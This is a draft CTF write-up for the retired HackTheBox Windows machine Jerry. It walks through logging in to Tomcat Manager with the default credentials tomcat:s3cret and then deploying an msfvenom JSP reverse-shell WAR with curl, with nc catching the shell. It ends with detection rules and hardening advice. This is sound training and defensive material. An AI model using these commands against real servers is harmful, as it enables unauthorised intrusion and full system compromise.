---
title: "WriteUp: Jerry — HackTheBox | Easy"
slug: writeup-htb-jerry
status: draft
tags: [ctf-writeup, hackthebox, easy, teaser]
excerpt: "An easy Windows HackTheBox machine. Full walkthrough in preparation."
format: html  # body is Ghost-ready HTML; restore via Admin API posts?source=html
---

<h1 id="jerry-%E2%80%94-hackthebox">Jerry — HackTheBox</h1><blockquote><strong>Preparation stub.</strong> Based on publicly documented information about this well-known retired<br>machine — not an original solve, and no live flag values are recorded. Use this as a study<br>scaffold; complete the bracketed fields when working the box under your own account. Only<br>document legally authorised activity.</blockquote><h2 id="engagement-metadata">Engagement metadata</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Field</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>Platform</td>
<td>HackTheBox</td>
</tr>
<tr>
<td>Machine</td>
<td>Jerry</td>
</tr>
<tr>
<td>Difficulty</td>
<td>Easy</td>
</tr>
<tr>
<td>Category</td>
<td>Windows</td>
</tr>
<tr>
<td>Target IP</td>
<td>10.10.x.x (lab-assigned)</td>
</tr>
<tr>
<td>Date completed</td>
<td>[YYYY-MM-DD]</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><h2 id="executive-summary">Executive summary</h2><p>A Windows host exposing <strong>Apache Tomcat</strong> on port 8080. The Tomcat Manager application is reachable<br>with <strong>default credentials</strong>, and the Manager interface permits deploying a <strong>WAR</strong> archive. A<br>malicious JSP web shell packaged as a WAR yields command execution as the Tomcat service account —<br>which on this host is <strong>NT AUTHORITY\SYSTEM</strong>, so both flags are captured in one step (famously<br>stored together in a single <code>2 for the price of 1.txt</code>).</p><h2 id="key-vulnerability-class">Key vulnerability class</h2><ul><li><strong>CWE:</strong> CWE-1392 / CWE-798 — Use of Default Credentials, leading to arbitrary application<br>deployment (CWE-94 code execution).</li><li><strong>Why it matters:</strong> the most common real-world web-app compromise pattern — an exposed admin<br>interface protected only by a vendor default password. No memory corruption, no CVE; just<br>enumeration discipline and knowing Tomcat's default <code>tomcat:s3cret</code>.</li></ul><h2 id="1-reconnaissance">1. Reconnaissance</h2><pre><code>nmap -sC -sV -p- -oA nmap/jerry 10.10.x.x
</code></pre><p>Expected exposed surface (confirm on completion):</p><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Port</th>
<th>Service</th>
<th>Version</th>
<th>Note</th>
</tr>
</thead>
<tbody>
<tr>
<td>8080/tcp</td>
<td>http</td>
<td>Apache Tomcat/Coyote JSP engine 1.1 (Tomcat 7.0.88)</td>
<td><strong>The vector</strong></td>
</tr>
</tbody>
</table><!--kg-card-end: html--><p>[Paste trimmed scan output on completion. Only one port is open — a strong hint the whole path is<br>through the web service.]</p><p><strong>nmap flag rationale:</strong></p><ul><li><code>-p-</code> — all 65,535 TCP ports. Here it confirms a <em>negative</em>: only 8080 is open, which itself is<br>a strong steer that the entire path runs through the web service.</li><li><code>-sV</code> — version detection. Pins <code>Apache Tomcat/Coyote JSP engine 1.1</code> and the Tomcat build, the<br>fact that tells you the Manager app and its default-credential weakness exist.</li><li><code>-sC</code> — default NSE scripts; <code>http-title</code> / <code>http-methods</code> surface the Tomcat landing page early.</li><li><code>-oA nmap/jerry</code> — preserve evidence of the single-port surface.</li></ul><p><strong>What to look for in the scan:</strong> a single open web port on 8080 with a Tomcat/Coyote banner.<br>Few-ports boxes mean <em>depth-first on what is open</em> beats broad scanning — and an exposed Tomcat<br>immediately raises the <code>/manager/html</code> default-credential question.</p><h2 id="2-enumeration">2. Enumeration</h2><pre><code>whatweb http://10.10.x.x:8080/
gobuster dir -u http://10.10.x.x:8080/ -w /usr/share/wordlists/dirb/common.txt
</code></pre><ul><li>Browse to <code>/manager/html</code>. It prompts for HTTP Basic auth.</li><li>Try Tomcat defaults — <code>tomcat:s3cret</code> is the documented working pair on this box. (Tomcat's<br><code>tomcat-users.xml</code> ships commented-out sample accounts; this host left one active.)</li><li><strong>Ruled out:</strong> brute-forcing other paths is unnecessary once the Manager app is reachable with<br>defaults — the fastest path is the intended one.</li><li>[Record the working credential discovery on completion.]</li></ul><p><strong>What to look for after web enumeration:</strong> the Tomcat <strong>Manager</strong> (<code>/manager/html</code>) and <strong>Host</strong><br><strong>Manager</strong> (<code>/host-manager/html</code>) paths, and whether they respond to default credentials<br>(<code>tomcat:s3cret</code>, <code>admin:admin</code>, <code>tomcat:tomcat</code>). <code>whatweb</code> confirms the exact Tomcat version;<br><code>gobuster</code> confirms Manager is reachable. The HTTP <strong>401 → 403 → 200</strong> progression on<br><code>/manager/html</code> tells you whether the issue is missing auth, IP restriction, or open access.</p><h2 id="3-exploitation">3. Exploitation</h2><ul><li><strong>Chosen vector and why:</strong> the Tomcat Manager "Deploy" function is designed to upload<br>applications; a WAR-packaged JSP shell is the canonical abuse and needs no exploit code.</li><li><strong>Phase tags:</strong> authenticating with the default pair is <strong>[ATT&amp;CK T1078 — Valid Accounts]</strong>;<br>deploying the WAR through the Manager is <strong>[ATT&amp;CK T1190 — Exploit Public-Facing Application]</strong>;<br>the deployed JSP is <strong>[ATT&amp;CK T1505.003 — Server Software Component: Web Shell]</strong>, which on<br>trigger executes commands <strong>[ATT&amp;CK T1059 — Command and Scripting Interpreter]</strong>.</li></ul><pre><code># Build a JSP reverse-shell WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;tun0 ip&gt; LPORT=4444 -f war -o shell.war
# Deploy via the Manager UI (Deploy → WAR file to deploy) or curl:
curl -u tomcat:s3cret -T shell.war "http://10.10.x.x:8080/manager/text/deploy?path=/shell"
# Catch the shell, then browse the deployed context to trigger it
nc -lvnp 4444
</code></pre><ul><li>Shell context: the Tomcat service runs as <strong>NT AUTHORITY\SYSTEM</strong> on this host.</li><li><strong>User flag:</strong> <code>[capture on completion]</code></li><li><strong>Root/system flag:</strong> <code>[capture on completion]</code></li></ul><h2 id="4-post-exploitation">4. Post-exploitation</h2><ul><li>Confirm privilege: <code>whoami</code> → expect <code>nt authority\system</code>.</li><li>Both flags live together on the Administrator desktop<br>(<code>C:\Users\Administrator\Desktop\flags\</code> — confirm on completion). No privesc needed.</li></ul><h2 id="5-tools-used">5. Tools used</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Phase</th>
<th>Tools</th>
</tr>
</thead>
<tbody>
<tr>
<td>Recon</td>
<td><code>nmap</code> (<code>-sC -sV -p-</code>)</td>
</tr>
<tr>
<td>Enumeration</td>
<td><code>whatweb</code>, <code>gobuster</code>, browser (Tomcat Manager)</td>
</tr>
<tr>
<td>Exploitation</td>
<td><code>msfvenom</code> (WAR JSP shell), <code>curl</code> / Tomcat Manager Deploy, <code>nc</code></td>
</tr>
<tr>
<td>Post-exploitation</td>
<td>manual flag collection</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><h2 id="6-mitre-attck-mapping">6. MITRE ATT&amp;CK mapping</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Tactic</th>
<th>Technique</th>
<th>ID</th>
</tr>
</thead>
<tbody>
<tr>
<td>Initial Access</td>
<td>Exploit Public-Facing Application</td>
<td>T1190</td>
</tr>
<tr>
<td>Initial Access / Privilege</td>
<td>Valid Accounts (default credentials)</td>
<td>T1078</td>
</tr>
<tr>
<td>Persistence / Execution</td>
<td>Server Software Component: Web Shell</td>
<td>T1505.003</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><h2 id="7-key-learnings">7. Key learnings</h2><ul><li><strong>Default credentials remain a top real-world initial-access vector</strong> — map it to OWASP A05<br>(Security Misconfiguration) and A07 (Identification &amp; Authentication Failures). Always test<br>vendor defaults against any admin interface before anything heavier.</li><li><strong>One open port narrows the methodology</strong> — when only 8080 is exposed, depth-first on that one<br>service beats broad scanning.</li><li><strong>Service account = your privilege ceiling</strong> — a Tomcat running as SYSTEM means web-app RCE is<br>immediately full compromise; the blue-team lesson is to run application servers as a low-privilege<br>service account.</li></ul><h2 id="8-defender-perspective-%E2%80%94-logs-detection">8. Defender perspective — logs &amp; detection</h2><p>What this attack looks like from a monitored SOC, and the rule that would catch it. (Offence→<br>detection bridge; see <a href="../methodology/ctf-methodology.md">../methodology/ctf-methodology.md §7</a>.)</p><p><strong>Log artefacts generated:</strong></p><ul><li><strong>Tomcat access log</strong> (<code>localhost_access_log.*</code>): a <code>POST</code>/<code>PUT</code> to<br><code>/manager/text/deploy</code> or <code>/manager/html/upload</code> preceded by a <code>401</code> then a <code>200</code> on<br><code>/manager/html</code> — the failed-then-successful Basic-auth pattern of a default-credential login,<br>followed by a deployment. A <code>GET</code> to a never-before-seen context path (<code>/shell/</code>) is the shell<br>being triggered.</li><li><strong>Tomcat manager audit:</strong> a new application context appearing outside any change window.</li><li><strong>Windows process telemetry (Sysmon Event ID 1):</strong> <code>Tomcat*.exe</code> / <code>java.exe</code> spawning<br><code>cmd.exe</code> or <code>powershell.exe</code> — an application server spawning a command interpreter is the<br>high-signal indicator. Parent = Tomcat, child = shell.</li><li><strong>Network:</strong> outbound TCP from the server to the attacker listener (the reverse shell), abnormal<br>for a host that should only <em>receive</em> on 8080.</li></ul><p><strong>Example detection logic (Splunk SPL):</strong></p><pre><code>index=web sourcetype=tomcat_access uri_path="/manager/text/deploy" (status=200 OR status=201)
| stats count by src_ip, uri_query, status
</code></pre><p>And the host-side companion (Sysmon):</p><pre><code>title: Tomcat spawns a shell (web-shell execution)
detection:
  selection:
    ParentImage|endswith: ['\\Tomcat*.exe', '\\java.exe']
    Image|endswith: ['\\cmd.exe', '\\powershell.exe']
  condition: selection
</code></pre><p><strong>Why it fires:</strong> legitimate Tomcat usage almost never deploys a WAR via the text API from an<br>external IP, and an application server spawning <code>cmd.exe</code> is behaviourally abnormal — the deploy<br>log catches the <em>delivery</em>, the Sysmon rule catches the <em>execution</em>. Maps to <strong>ATT&amp;CK T1190 /</strong><br><strong>T1078 / T1505.003 / T1059</strong>.</p><p><strong>Defensive controls:</strong> remove or firewall the Manager app; replace default <code>tomcat-users.xml</code><br>credentials; run Tomcat as a low-privilege service account (so RCE ≠ SYSTEM); restrict deploy<br>endpoints to localhost; alert on new context deployments.</p><h2 id="9-references">9. References</h2><ul><li>Apache Tomcat Manager documentation — deployment and <code>tomcat-users.xml</code> defaults.</li><li>MITRE ATT&amp;CK T1190 / T1078 / T1505.003 / T1059.</li></ul>
